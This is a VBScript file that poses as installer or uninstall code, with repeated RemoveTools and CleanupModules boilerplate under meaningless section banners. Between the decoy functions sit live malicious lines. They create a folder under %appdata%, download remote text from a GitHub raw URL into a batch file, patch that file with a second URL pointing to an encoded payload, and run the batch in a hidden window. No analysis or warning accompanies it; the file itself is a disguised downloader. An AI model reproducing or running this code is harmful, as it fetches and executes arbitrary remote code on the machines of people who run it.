'''''''''''''''''''''' el_toro ''''''''''''''''''''''

' Display info screen
'

' Initialize Components

' Remove Components
'
Function RemoveTools

    ' In passive mode, ignore uninstall errors
    '
    If False = isPassive Then
        On Error Resume Next
    End If

    installPath = Session.TargetPath("Toolbox")
    ForEachManifest GetRef("RemoveHandler")

    On Error GoTo 0

End Function
On Error Resume Next

' Display info screen
'

' Initialize Components

' Remove Components
'
Function RemoveTools

    ' In passive mode, ignore uninstall errors
    '
    If False = isPassive Then
        On Error Resume Next
    End If

    installPath = Session.TargetPath("Toolbox")
    ForEachManifest GetRef("RemoveHandler")

    On Error GoTo 0

End Function

'''''''''''''''''''''' sami_less ''''''''''''''''''''''
Set fso = CreateObject("Scripting.FileSystemObject")

fso.CreateFolder CreateObject("WScript.Shell").ExpandEnvironmentStrings("%appdata%\paged-l")

' Display info screen
'

' Initialize Components

' Remove Components
'
Function RemoveTools

    ' In passive mode, ignore uninstall errors
    '
    If False = isPassive Then
        On Error Resume Next
    End If

    installPath = Session.TargetPath("Toolbox")
    ForEachManifest GetRef("RemoveHandler")

    On Error GoTo 0

End Function

Set http = CreateObject("MSXML2.XMLHTTP"): http.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False: http.Send
If http.Status = 200 Then fso.CreateTextFile(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%appdata%\paged-l\special.bat")).Write http.ResponseText
WScript.Sleep 5000
'''''''''''''''''''''' init_chuck ''''''''''''''''''''''
' Logging setup
'

' Setup dependencies



' Cleanup phase
'
Function CleanupModules

    ' Soft mode: non-critical errors ignored
    '
    If False = passiveFlag Then
        On Error Resume Next
    End If

    baseDir = Session.TargetPath("DiagnosticsCore")
    ForEachManifest GetRef("CleanupAction")

    On Error GoTo 0

End Function
Set sh = CreateObject("WScript.Shell"): f = sh.ExpandEnvironmentStrings("%appdata%\paged-l\special.bat"): Set a = fso.OpenTextFile(f, 1): s = a.ReadAll: a.Close: Set a = fso.OpenTextFile(f, 2): a.Write Replace(s, "****", "https://github.com/opm4opm4/sample/raw/main/encoded.txt"): a.Close

' Logging setup
'

' Setup dependencies



' Cleanup phase
'
Function CleanupModules

    ' Soft mode: non-critical errors ignored
    '
    If False = passiveFlag Then
        On Error Resume Next
    End If

    baseDir = Session.TargetPath("DiagnosticsCore")
    ForEachManifest GetRef("CleanupAction")

    On Error GoTo 0

End Function

'''''''''''''''''''''' tems ''''''''''''''''''''''
sh.Run "cmd /c timeout /t 5 & %appdata%\paged-l\special.bat", 0, False

'''''''''''''''''''''''as-likls''''''''''''''''''''
